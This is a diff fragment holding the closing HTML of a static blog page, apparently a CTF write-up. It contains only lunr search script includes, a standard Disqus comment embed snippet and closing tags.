+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/mma-2nd-ctf-2016-interpreter"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
